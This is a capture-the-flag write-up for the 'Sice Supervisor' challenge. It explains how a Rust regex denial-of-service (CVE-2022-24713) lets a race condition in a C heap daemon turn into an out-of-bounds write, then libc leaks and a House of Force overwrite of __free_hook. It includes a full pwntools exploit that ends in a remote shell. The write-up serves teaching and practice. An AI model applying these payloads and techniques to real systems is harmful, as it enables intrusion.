# Sice Supervisor

Disclaimer: I did not solve the challenge during the CTF.
I was able to identify the vulnerability and use it to gain a write out of bounds, and develop an exploit plan from there.
Unfortunately, implementing this proved rather difficult due to issues I encountered with debugging the challenge.
For this reason, much of the exploit here is based on the solution by one of the authors, triacontakai.

## Challenge

We're given a Rust binary (`sice_supervisor`) and a C binary (`deet_daemon`).
We also get their respective source files, but not the rest of the build files.
Lastly, we have the libraries and linker for setting up a debug environment and finding offsets.

By connecting to the target, we interact with the prompt of the Rust binary, which allows us to spawn child processes of the C binary and interact with them.

The Rust binary has the following options:
- **Deploy a deet daemon**: spawn a `deet_daemon` child process
- **Sice a deet daemon**: send a string to the stdin of a chosen child process
- **Filter a deet daemon**: apply a regex filter to the next stdout data of a chosen child process
- **Exit** exits

The C binary has the following options:
- **Add deet**: call `malloc` with a specified size, store the pointer and size in a global array
- **Remove deet**: `free` an index from the global array, clear the pointer and size
- **Edit deet**: `memcpy` from user input to a heap chunk, with a size equal to the stored size
- **View deet**: call `puts` on a heap chunk
- **Exit**: exits

Notably, the C binary contains very little feedback.
The menu is only printed once, at the start of the program, and we don't get prompts or feedback except for some cases.

The Rust binary uses a separate threads to handle stdout from the C binary.

The C binary uses a new thread to perform every action we request.
Without an additional vulnerability, race conditions are highly improbably due to a `sleep(3)` called at the end of each `main` loop iteration.

## Solution

### Arena Leak

First, note that heap chunks are not cleared when freed or allocated, so we can leak a pointer to the arena simply by freeing, allocating, and reading from an unsorted bin chunk.

Unfortunately, our allocations are in a thread arena, so we can't use this to find the address of libc.

### Denial-of-Service

We can examine the Rust binary closer by looking at the strings contained within the binary, which reveals the external dependencies compiled with it.
Of these dependencies, only the regex crate is out of date.
If we look at the version of this crate, we find it is the last version vulnerable to a DOS CVE.

https://blog.rust-lang.org/2022/03/08/cve-2022-24713.html

When a user-supplied regex expression is compiled, it can cause a denial-of-service on the thread.
An example is the following expression: `(?:){50000000}`

Importantly, the stdout of `deet_daemon` is not buffered, so writing to stdout will block until something is able to read it.

When a `deet_daemon` is spawned, the `sice_supervisor` creates a thread to check for regex filters, apply them if present, and send output back to the user:

```rust
thread::spawn(move || { 
    let mut input_buf: [u8; 100000] = [0; 100000];
    loop {
    let filter = receiver.try_recv().ok().map(|s: String| Regex::new(s.as_str()).expect("failed to create filter"));

    let sz = stdout.read(&mut input_buf).expect("failed to read deet");
    if sz > 0 && filter.filter(|f| !f.is_match(&input_buf[..sz])).is_none() {
        io::stdout().write_all(&input_buf[..sz]).expect("failed to write to stdout");
        io::stdout().flush().expect("failed to flush stdout");
    }
    }
});
```

### Race Condition

If we send a filter such as the one described above, we can cause this thread to block.
This in turn, will block any of the `deet_daemon` threads trying to write to stdout.
Since this is done on different threads from the main thread in both processes, we can still send commands to both processes, which can still be fulfilled as long as they do not try to write to stdout.
This is why the binary gives such little feedback.

The relevant C function for a race-condition is the `edit_deet` function:

```c
void * edit_deet(void * args) {
    unsigned long i = (unsigned long) ((void **) args)[0];
    if (i < MAX_DEET && deets[i] != NULL) {
        unsigned long sz = sizes[i];
        printf("Editing deet of size %lu\n", sz);
        memcpy(deets[i], ((void **) args)[1], sz);
        puts("Done!");
    } else {
        puts("Invalid index!");
    }
    return NULL;
}
```

### Write Out-of-Bounds

The block will happen on the `printf` call, after the size of the chunk has been saved in `sz`.
Therefore, if we call `edit_deet` on a chunk with a large size, we can achieve an out-of-bounds write by blocking the thread, then replacing the heap chunk with a smaller one.

### Libc Leak

Using the write out-of-bounds, we can use a House of Force attack to overwrite the top chunk metadata, allowing us to allocate chunks at arbitrary addresses.

We can allocate an address in the thread area so it can read the pointer to the next arena, which in our case is the main arena in libc.
By reading this pointer, we can calculate the address of libc from its offset.

### Remote Code Execution

I didn't get this far myself, but triacontakai had a brillant trick for overwriting `__free_hook` using House of Force.
They placed a new chunk such that the metadata landed in `__free_hook`.
The top chunk overwrite to setup this attack was calculated such that the size would be the address of the cuntion they wanted to execute.
In this case, they used `system+1` to run a shell command while still satisfying the in-use bit.
This technique is demonstrated in the exploit script below, which is heavily based on triacontakai's own script.

Another competitor dfyz had another amazing technique for forging a fastbin chunk to overwrite `__free_hook`.
Using the previous techniques, they could overwrite any fastbin pointer in the arena.
By manipulating the locks for the standard file streams, they were able to create a fake fastbin header which they could allocate to and use to overwrite the `__free_hook`.

## Exploit

```py
###!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mc.ax --port 30283 deet_daemon
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('sice_supervisor')
child = ELF('deet_daemon')
libc = ELF('libs/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 30283)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./libs/'

class Daemon:
    def __init__(self, io):
        self.io = io
        self.io.sendlineafter(b'> ', b'1')
        self.io.recvuntil(b'Created deet ')
        self.index = int(self.io.recvuntil(b'\n', drop=True))

    def sice(self, string):
        self.io.sendlineafter(b'> ', b'2')
        self.io.sendlineafter(b'> ', str(self.index).encode())
        self.io.sendafter(b'> ', string)

    def filter(self, string):
        self.io.sendlineafter(b'> ', b'3')
        self.io.sendlineafter(b'> ', str(self.index).encode())
        self.io.sendlineafter(b'> ', string)

    def add_deet(self, size):
        self.sice(b'1\n')
        self.sice(f'{size}\n'.encode())

    def remove_deet(self, index):
        self.sice(b'2\n')
        self.sice(f'{index}\n'.encode())

    # requires sice after
    def edit_deet(self, index):
        self.sice(b'3\n')
        self.sice(f'{index}\n'.encode())

    def view_deet(self, index):
        self.sice(b'4\n')
        self.sice(f'{index}\n'.encode())

    def sync(self):
        daemon.view_deet(-1)
        res = self.io.recvuntil(b'Invalid index!\n', drop=True)
        self.io.unrecv(b'> ')
        return res
    
    def leak(self, index):
        self.view_deet(index)
        pre = self.io.recvuntil(b'Viewing deet\n')
        res = unpack(self.io.recvuntil(b'\nDone!\n', drop=True), 'all')
        self.io.unrecv(b'> ')
        return res

io = start()

daemon = Daemon(io)

daemon.add_deet(0x5e8)
daemon.add_deet(0x18)
daemon.add_deet(0x18)
daemon.remove_deet(0)
daemon.add_deet(3)
daemon.edit_deet(0)
daemon.sice(b'A' * 3 + b'\n')
arena = daemon.leak(0) & 0xffffffffff000000
log.info(f"arena: {hex(arena)}")

daemon.add_deet(100000)
daemon.edit_deet(3)
for _ in range(98):
    daemon.sice(b'A' * 1000)
daemon.sice(b'A' * 999 + b'\n')
daemon.add_deet(0x7c8)
daemon.sync()
daemon.filter(b"(?:){50000000}")
daemon.view_deet(3)
daemon.view_deet(3)
payload = flat({
    0x638: 0xffffffffffffffff,
})
daemon.edit_deet(4)
daemon.sice(payload[:1000])
daemon.sice(payload[1000:] + b'\n')
daemon.remove_deet(4)
daemon.add_deet(0x638)

daemon.sync()
top = 0x19e30
target = 0x880
size = ((target - top) % 2**64) - 8
daemon.add_deet(size)
daemon.add_deet(0x6f8)
daemon.add_deet(0x5c0)
libc.address = daemon.leak(6) - 0x3ebc40
log.info(f"libc: {hex(libc.address)}")

daemon.add_deet(0xa8)
daemon.sync()
daemon.filter(b"(?:){50000000}")
daemon.view_deet(3)
daemon.view_deet(3)
target = libc.symbols['__free_hook'] - 8
top = arena + 0xfd0
size = ((target - top) % 2**64) - 8
payload = flat({
    0x0: b'/bin/sh\x00',
    0x48: size + 8 + libc.symbols['system'],
})
daemon.edit_deet(8)
daemon.sice(payload + b'\n')
daemon.remove_deet(8)
daemon.add_deet(0x48)
daemon.sync()
daemon.add_deet(size)
daemon.remove_deet(8)
daemon.sync()

while True:
    cmd = input('$ ')
    if cmd.strip() == 'exit':
        break
    daemon.sice(cmd.encode() + b'\n')
    io.recvuntil(b'> ')
    print(io.recv(timeout=3).decode('utf-8', 'backslashreplace'), end='')
    io.unrecv(b'> ')

io.interactive()
```

## Flag

```
dice{i_hate_race_conditions_i_hate_race_conditions}
```
